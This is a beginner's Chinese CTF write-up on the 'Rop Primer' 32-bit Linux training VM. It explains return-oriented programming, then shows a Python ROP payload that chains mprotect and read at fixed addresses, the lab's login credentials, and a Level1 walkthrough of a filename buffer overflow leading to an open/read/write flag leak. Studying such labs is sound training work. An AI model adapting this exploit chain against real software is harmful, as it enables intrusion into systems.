
# [原创][新手向]Pwn学习笔记：Rop Primer靶机实战

## 前言

ROP靶机是一个用于训练CTF中的Pwn的平台，该靶机设计在Linux 32位系统中，一共分为3个等级。

ROP全称为Return-oriented Programming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码

```
import sys

import struct



def p(x):

        return struct.pack('<L',x)



mpro=0x80523e0

read=0x80517f0

pop3ret=0x8048882



payload="\x41"*44



payload+=p(mpro)

payload+=p(pop3ret)

payload+=p(0xbffdf000)

payload+=p(0x21000)

payload+=p(0x7)

payload+=p(read)

payload+=p(0xbffdf000)

payload+=p(0x00)



payload+=p(0xbffdf000)

payload+=p(0x666)



print payload

```

## Level1

首先，根据题目提示，以账号`level1`和密码`shodan`登录靶机，查看到文件`flag`和`level1`相关信息。

![](https://bbs.kanxue.com/upload/attach/201904/823237_YWMNW8RZ8JF9K47.jpg)

`level1` 为动态链接的32位程序，开启了`NX`保护

![](https://bbs.kanxue.com/upload/attach/201904/823237_KWEUA7HCYW3UJCZ.jpg)

上来直接运行 `level` 程序，发现一直提示 error `bind()`ing ，`ltrace`看一下发现 `bind` 一直返回 -1，说明地址绑定不成功

![](https://bbs.kanxue.com/upload/attach/201904/823237_QUW8JXZ5HEUKHMV.jpg)

查看一下本地的端口和进程信息，发现8888端口一直处于监听状态，且属于`level2`用户

![](https://bbs.kanxue.com/upload/attach/201904/823237_PTTRVCW78MBWDPH.jpg)

直接`nc`过去，猜测该端口上运行着一个属于 `level2` 用户的 `level1` 程序

![](https://bbs.kanxue.com/upload/attach/201904/823237_KDYYVSXXQWPX6BR.jpg)

再来看题目本身，通过题目的说明，根据程序源代码找到漏洞点：漏洞产生的原因为对 `char` `filename[32]` 执行了以下操作，而变量 `filesize` 由用户输入，因此会造成溢出

![](https://bbs.kanxue.com/upload/attach/201904/823237_TWE7Z67MRPG9PDU.jpg)

出题者提示通过 `level1` 二进制文件中的 `open`/`read`/`write` 函数来拿到`flag`。顺藤摸瓜，这里很自然想到处理流程为

1.计算偏移量，溢出

2.执行`open`，打开`flag`文件

3.`read`读取`flag`文件内容

4.`write`将`flag`写出
